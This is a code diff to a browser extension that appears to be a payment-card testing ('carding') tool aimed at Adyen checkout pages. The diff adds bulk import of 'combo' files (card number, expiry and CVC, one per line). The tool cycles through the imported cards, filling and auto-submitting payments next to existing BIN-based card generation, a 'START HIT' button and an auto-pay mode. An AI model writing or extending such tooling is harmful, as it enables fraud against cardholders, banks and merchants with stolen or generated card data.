@@ -17,6 +17,57 @@
   let modalStarted = false;
   let hostOk = false;
   let autoScheduled = false;
+  let importedCombos = [];
+  let currentComboIndex = 0;
+  const combosKey = "adyenCombos";
+  let comboListEl = null;
+
+  function saveCombos() {
+    try {
+      chrome.storage.local.set({ [combosKey]: { combos: importedCombos, index: currentComboIndex } });
+    } catch (e) {}
+  }
+
+  function loadCombos() {
+    return new Promise((resolve) => {
+      try {
+        chrome.storage.local.get([combosKey], (res) => {
+          const data = res[combosKey];
+          if (data && data.combos && Array.isArray(data.combos)) {
+            importedCombos = data.combos;
+            currentComboIndex = data.index || 0;
+          }
+          resolve();
+        });
+      } catch (e) {
+        resolve();
+      }
+    });
+  }
+
+  function updateComboList() {
+    if (!comboListEl) return;
+    if (importedCombos.length === 0) {
+      comboListEl.style.display = "none";
+      return;
+    }
+    comboListEl.style.display = "block";
+    comboListEl.innerHTML = "";
+    importedCombos.forEach((combo, idx) => {
+      const item = document.createElement("div");
+      item.style.cssText = "padding:4px 6px;border-bottom:1px solid #141c26;color:" +
+        (idx === currentComboIndex ? "#00d1b2" : "#8fa3b5") + ";display:flex;justify-content:space-between;align-items:center;cursor:pointer";
+      const masked = combo.number.slice(0, 6) + "..." + combo.number.slice(-4);
+      item.innerHTML = '<span>' + masked + ' | ' + combo.month + '/' + combo.year.slice(-2) + '</span>' +
+        '<span style="font-size:9px;color:#46566a">' + (idx === currentComboIndex ? '▶' : '') + '</span>';
+      item.addEventListener("click", () => {
+        currentComboIndex = idx;
+        saveCombos();
+        updateComboList();
+      });
+      comboListEl.appendChild(item);
+    });
+  }
 
   const VERSION = "1.10";
 
@@ -818,6 +869,23 @@
           </label>
         </div>
 
+        <div style="margin-top:8px;border-top:1px solid #1a2430;padding-top:8px">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
+            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Combo File Import</label>
+            <span id="nono-combo-count" style="font-size:9px;color:#00d1b2">0 combos</span>
+          </div>
+          <div style="display:flex;gap:6px">
+            <label id="nono-upload-btn" style="flex:1;padding:8px;background:#23303c;color:#e6e6e6;border:none;border-radius:8px;font-size:11px;cursor:pointer;text-align:center;font-weight:600">
+              📁 Upload Combo File
+            </label>
+            <input type="file" id="nono-file-input" accept=".txt,.csv" style="display:none">
+            <button id="nono-clear-combos" style="padding:8px;background:#23303c;color:#e6e6e6;border:none;border-radius:8px;font-size:11px;cursor:pointer;font-weight:600">Clear</button>
+          </div>
+          <div id="nono-combo-list" style="max-height:80px;overflow-y:auto;font-size:10px;margin-top:6px;border:1px solid #1a2430;border-radius:6px;background:#0a0d12;display:none">
+          </div>
+          <div style="font-size:9px;color:#46566a;margin-top:4px">Format: cardnumber|mm|yyyy|cvc (one per line)</div>
+        </div>
+
         <div style="display:flex;gap:6px;margin-top:4px">
           <button id="nono-start" style="flex:2;padding:11px;background:linear-gradient(135deg,#00d1b2,#00a88c);color:#00110d;border:none;border-radius:9px;font-weight:700;font-size:13px;cursor:pointer">&#9654; START HIT</button>
           <button id="nono-stop" style="flex:1;padding:11px;background:#23303c;color:#e6e6e6;border:none;border-radius:9px;font-weight:600;font-size:12px;cursor:pointer">STOP</button>
@@ -926,6 +994,7 @@
     });
 
     const el = (id) => panel.querySelector(id);
+    comboListEl = el("#nono-combo-list");
 
     function savePanelState() {
       const cfg = {
@@ -996,6 +1065,53 @@
       stopRequested = true;
       detachCapture();
       logMsg("Stopped by Chief.");
+    });
+
+    el("#nono-upload-btn").addEventListener("click", () => {
+      el("#nono-file-input").click();
+    });
+
+    el("#nono-file-input").addEventListener("change", (e) => {
+      const file = e.target.files[0];
+      if (!file) return;
+
+      const reader = new FileReader();
+      reader.onload = (event) => {
+        const content = event.target.result;
+        const lines = content.split(/\r?\n/).filter(line => line.trim());
+
+        importedCombos = lines.map(line => {
+          const parts = line.split("|").map(s => s.trim());
+          return {
+            number: (parts[0] || "").replace(/\s/g, ""),
+            month: parts[1] || "",
+            year: parts[2] || "",
+            cvc: parts[3] || ""
+          };
+        }).filter(c => c.number && c.month && c.year && c.cvc);
+
+        currentComboIndex = 0;
+        saveCombos();
+        updateComboList();
+        el("#nono-combo-count").textContent = importedCombos.length + " combos";
+
+        if (importedCombos.length > 0) {
+          logMsg("Loaded " + importedCombos.length + " combos");
+        } else {
+          logMsg("No valid combos found");
+        }
+      };
+      reader.readAsText(file);
+      e.target.value = '';
+    });
+
+    el("#nono-clear-combos").addEventListener("click", () => {
+      importedCombos = [];
+      currentComboIndex = 0;
+      saveCombos();
+      updateComboList();
+      el("#nono-combo-count").textContent = "0 combos";
+      logMsg("Combos cleared");
     });
 
     const proxyEl = (id) => panel.querySelector(id);
@@ -1076,9 +1192,9 @@
       }
 
       const cfg = await getConfig();
-      const hasCard = (cfg && (cfg.combo || cfg.bin));
+      const hasCard = (cfg && (cfg.combo || cfg.bin)) || importedCombos.length > 0;
       if (!hasCard) {
-        logMsg("Give me a BIN or combo first, Chief.");
+        logMsg("Give me a BIN, combo, or combo file first, Chief.");
         return;
       }
 
@@ -1111,7 +1227,12 @@
         if (ua && ua.label) logMsg("UA: " + ua.label);
 
         let card;
-        if (cfg && cfg.combo) {
+        if (importedCombos.length > 0) {
+          const combo = importedCombos[currentComboIndex];
+          card = { number: combo.number, month: combo.month, year: combo.year, cvc: combo.cvc, holder: (cfg && cfg.holder) || "JOHN DOE" };
+          currentComboIndex = (currentComboIndex + 1) % importedCombos.length;
+          saveCombos();
+        } else if (cfg && cfg.combo) {
           const p = parseCombo(cfg.combo);
           card = { number: p.number, month: p.month, year: p.year, cvc: p.cvc, holder: cfg.holder || "JOHN DOE" };
         } else if (window.CardGen && cfg && cfg.bin) {
@@ -1278,9 +1399,9 @@
         const sess = parseCheckshopper(txt);
         if (!sess || !sess.payUrl) return;
         const cfg = await getConfig();
-        if (!(cfg && (cfg.combo || cfg.bin))) {
-          csSet("need BIN/combo", "#ffd166");
-          logMsg("Auto-pay armed — add a BIN or combo above and it pays by itself.");
+        if (!(cfg && (cfg.combo || cfg.bin)) && importedCombos.length === 0) {
+          csSet("need BIN/combo/file", "#ffd166");
+          logMsg("Auto-pay armed — add a BIN, combo, or combo file above and it pays by itself.");
           return;
         }
         sess.rawUrl = txt;
@@ -1306,8 +1427,8 @@
         }
         const bin = el("#nono-bin").value.trim();
         const combo = el("#nono-combo").value.trim();
-        if (!bin && !combo) {
-          logMsg("Give me a BIN or combo first, Chief.");
+        if (!bin && !combo && importedCombos.length === 0) {
+          logMsg("Give me a BIN, combo, or combo file first, Chief.");
           return;
         }
         savePanelState();
@@ -1372,7 +1493,12 @@
       }
 
       let card;
-      if (cfg.combo) {
+      if (importedCombos.length > 0) {
+        const combo = importedCombos[currentComboIndex];
+        card = { number: combo.number, month: combo.month, year: combo.year, cvc: combo.cvc, holder: cfg.holder || "JOHN DOE" };
+        currentComboIndex = (currentComboIndex + 1) % importedCombos.length;
+        saveCombos();
+      } else if (cfg.combo) {
         const p = parseCombo(cfg.combo);
         card = { number: p.number, month: p.month, year: p.year, cvc: p.cvc, holder: cfg.holder || "JOHN DOE" };
       } else {
@@ -1512,7 +1638,11 @@
       return;
     }
     removeBlockedNotice();
+    await loadCombos();
     buildPanel();
+    updateComboList();
+    const comboCountEl = document.getElementById("nono-combo-count");
+    if (comboCountEl) comboCountEl.textContent = importedCombos.length + " combos";
     const cfg = await getConfig();
     if (cfg) {
       const ids = ["nono-bin", "nono-combo", "nono-holder", "nono-len", "nono-autosubmit", "nono-autoonload"];
